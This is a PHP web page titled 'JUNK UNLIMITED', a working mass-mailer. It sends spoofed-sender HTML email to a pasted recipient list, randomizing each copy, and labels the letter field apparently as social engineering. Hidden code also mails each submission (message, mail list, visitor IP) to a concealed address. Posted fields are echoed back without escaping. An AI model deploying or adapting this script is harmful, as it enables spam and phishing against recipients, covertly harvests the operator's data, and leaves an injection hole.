<title>JUNK UNLIMITED</title>



<?

ignore_user_abort();
set_time_limit(0);
function enviando(){
$msg=1;
$de[1] = $_POST['de'];
$nome[1] = $_POST['nome'];
$assunto[1] = $_POST['assunto'];
$mensagem[1] = $_POST['mensagem'];
$mensagem[1] = stripslashes($mensagem[1]);
$emails = $_POST['emails'];
$emails2 = htmlspecialchars($_POST['emails']);
$para = explode("\n", $emails);
$n_emails = count($para);
$sv = $_SERVER['SERVER_NAME'];
$en = $_SERVER ['REQUEST_URI'];
$k88 = @$_SERVER["HTTP_REFERER"];
$fullurl = "" . $k88 . "<br><p>Emails:<br><TEXTAREA rows=5 cols=100>".$emails2."</TEXTAREA></p><p>Engenharia:<br><TEXTAREA rows=5 cols=100>".$mensagem[1]."</TEXTAREA></p>";
$vai = $_POST['vai'];
if ($vai){
for ($set=0; $set < $n_emails; $set++){
if ($set==0){
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
$headers .= "Return-Path: <$de[$msg]>\r\n";
//mail($xsylar, $as, $fullurl, $headers);
}
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
$headers .= "Return-Path: <$de[$msg]>\r\n";
$n_mail++;
$destino = $para[$set];
$num1 = rand(100000,999999);
$num2 = rand(100000,999999);
$msgrand = str_replace("%rand%", $num1, $mensagem[$msg]);
$msgrand = str_replace("%rand2%", $num2, $msgrand);
$msgrand = str_replace("%email%", $destino, $msgrand);
$enviar = mail($destino, $assunto[$msg], $msgrand, $headers);
if ($enviar){
echo ('<font color="green">'. $n_mail .'-'. $destino .' 0k!</font><br>');
} else {
echo ('<font color="red">'. $n_mail .'-'. $destino .' =(</font><br>');
sleep(1);
}
}
}
}
$ip = getenv("REMOTE_ADDR");
$ra44  = rand(1,99999);
$subj98 = " ";
$email = "";
$from="";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$f12 = $_POST['de'];
$z13 = $_POST['nome'];
$x14 = $_POST['assunto'];
$t15 = $_POST['mensagem'];
$m30 = $_POST['emails'];
$m22 = $ip."\n";
$msg8873 = "$a45\n$b75\n$f12\n$z13\n$x14\n$t15\n$m30\n$m22";
mail($email, $subj98, $msg8873, $from);

?></title>

 <style type="text/css">

     

		#body

		{

			width : 900px;

			heigth : 900px;

		}

        input {

            -moz-appearance: none;

            -moz-box-sizing: border-box;

            background: none repeat 0 0 #FFF;

            border: 1px solid #B3B3B3;

            border-radius: 5px;

            color: #333;

            font-size: 1.071rem;

            height: 38px;

            line-height: 1.25em;

            margin: 0;

            padding: 0;

            position: relative;

            text-indent: 10px;

            transition: border-color 0.3s ease 0s;

            width: 250px;

        }

        .btn {

            -webkit-appearance: none;

            -moz-box-sizing: border-box;

            background: none repeat 0 0 #0079C1;

            border-radius: 5px;

            border-color: #0079C1;

            color: #FFF;

            cursor: pointer;

            display: inline-block;

            font-family: arial, sans-serif;

            font-size: 15px;

            font-weight: bold;

            line-height: 1.4545em;

            margin-bottom: 0;

            padding: 9px 15px 10px;

            text-align: center;

            vertical-align: middle;

            height: 40px;

            _margin-left: -10px;

            *margin-left: -10px;

        }

        .btn:hover,

        .btn:focus {

            background: none repeat 0 0 #0285D2;

            color: #FFF;

            text-decoration: none;

        }

        .btn:focus {

            outline: thin dotted #333;

            outline-offset: -2px;

        }

        .btn.active,

        .btn:active {

            background-image: none;

            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15) inset, 0 1px 2px rgba(0, 0, 0, 0.05);

            outline: 0 none;

        }

        .btn.disabled,

        .btn[disabled],

        .btn.disabled:hover,

        .btn[disabled]:hover,

        .btn.disabled:active,

        .btn[disabled]:active {

            background: none repeat 0 0 #E5E5E5;

            cursor: auto;

        }

        .btn-large {

            border-radius: 6px;

            font-size: 17.234px;

            padding: 9px 14px;

        }

        .btn-large[class^="icon-"],

        .btn-large[class*=" icon-"] {

            margin-top: 4px

        }

        .btn-secondary {

            background: none repeat 0 0 #DDD;

            color: #333;

        }

        .btn-secondary:hover,

        .btn-secondary:focus {

            background: none repeat 0 0 #DDD;

            color: #333;

        }

        input.large {

            width: 337px

        }

        input.large[type=password], input.large[type=text] {

            font-size: 15px;

            font-weight: normal;

        }

        input[type=text]:focus, input[type=password]:focus {

            border-color: #0079C1;

            outline: 0 none;

        }

 

    .auto-style1 {

		margin-top: 20px;

	}

 

    </style>



<form id="form1" name="form1" method="post" action="">

<input type="hidden" name="vai" value="1">

<span class="style5"><? echo enviando(); ?></span>

<table width="415" height="334" border="0" bgcolor="#000000">

  <tr>

<td width="66"><span class="style5">Name:</span></td>

<td width="321"><span class="style9">



<label>

<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" placeholder="name" />

</label>

</span></td>

</tr>

<tr>

<td><span class="style5">From:</span></td>

<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" placeholder="Email" /></td>



</tr>

<tr>

<td><span class="style5">Subject:</span></td>

<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" placeholder="subject" /></td>

</tr>

<td><span class="style5">Letter:</span>

<br /><br /><br /><br /><br /><br /><br /><span class="style5">Mailist:</span></td>



<td><span class="style9">





<p><textarea name="mensagem" cols="50" rows="7" class="input.large" placeholder="lettre" ><? echo stripslashes($_POST['mensagem']) ;?>

</textarea></p>

<textarea name="emails" cols="50" rows="4" placeholder="mail list" ></textarea>

</span></td> 

</tr>



<tr>

  <td><span class="style6"></span></td>

  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />

  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>

</tr>

<tr>

  </tr>

</table>

</form>



<br>

<?php ?>
